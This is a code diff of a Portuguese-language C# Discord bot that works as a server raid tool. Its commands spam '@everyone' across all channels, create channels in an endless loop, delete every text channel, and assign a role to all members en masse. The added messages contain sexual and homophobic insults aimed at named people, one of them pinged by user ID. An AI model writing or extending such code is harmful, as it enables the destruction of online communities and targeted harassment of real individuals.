@@ -23,7 +23,7 @@ namespace DiscordBot.Comandos
                 return;
             }
             var channels = guild.TextChannels;
-            var message = "@everyone Daniela gostosa demais seloko https://www.youtube.com/watch?v=izSXarv7vbM";
+            var message = "@everyone waltrick filha da puta";
 
             await Task.WhenAll(channels.Select (async channel =>
             {
@@ -51,7 +51,7 @@ namespace DiscordBot.Comandos
 
             while (true)
             {
-                string channelName = $"daniela-{canalCount}";
+                string channelName = $"sexo-{canalCount}";
                 canalCount++;
 
                 try
@@ -113,9 +113,9 @@ namespace DiscordBot.Comandos
                     {
                         try
                         {
-                            var channel = await guild.CreateTextChannelAsync($"daniela-{i}");
-                            await channel.SendMessageAsync("@everyone daniela gostosa dms n tem jeito");
-                            Console.WriteLine($"Daniela-{i} criado");
+                            var channel = await guild.CreateTextChannelAsync($"sexo-{i}");
+                            await channel.SendMessageAsync("@everyone icaruh");
+                            Console.WriteLine($"18cm mole -{i} criado");
                         }
                         catch (Exception ex)
                         {
@@ -142,6 +142,86 @@ namespace DiscordBot.Comandos
 
         }
 
+        [Command("apy")]
+        public async Task ApagarCanaisAsync()
+        {
+            var guild = Context.Guild as SocketGuild;
+            if (guild == null)
+            {
+                await ReplyAsync("Sem acesso aos canais desse servidor.");
+                return;
+            }
+
+            var deleteTasks = guild.TextChannels.Select(async channel =>
+            {
+                try
+                {
+                    await channel.DeleteAsync();
+                    Console.WriteLine($"{channel.Name} deletado.");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"erro");
+                }
+            });
+
+            await Task.WhenAll(deleteTasks);
+
+            await ReplyAsync("apagados");
+        }
+
+        [Command("wal")]
+        public async Task WalAsync()
+        {
+
+            await ReplyAsync("<@624081697289404416> é viado e gosta de varias rolas");
+        }
+
+        [Command("regras")]
+        public async Task regrasAsync()
+        {
+            await ReplyAsync("regra 1 - bla bla bla");
+        }
+
+        [Command("darcargo")]
+
+        public async Task DarCargoAsync(ulong roleId)
+        {
+            var guild = Context.Guild;
+            if (guild == null)
+            {
+                await ReplyAsync("Erro ao entrar no servidor");
+                return;
+            }
+
+
+            var role = guild.GetRole(roleId);
+            if (role == null)
+            {
+                await ReplyAsync($"cargo nao encontrado.");
+                return;
+            }
+
+
+            var members = guild.Users.Where(u => !u.IsBot); 
+            foreach (var member in members)
+            {
+                try
+                {
+                    if (!member.Roles.Contains(role)) 
+                    {
+                        await member.AddRoleAsync(role);
+                        Console.WriteLine($"Cargo '{role.Name}' adicionado nesse arrombado ai {member.Username}.");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Erro");
+                }
+            }
+        }
+
 
     }
 }
+
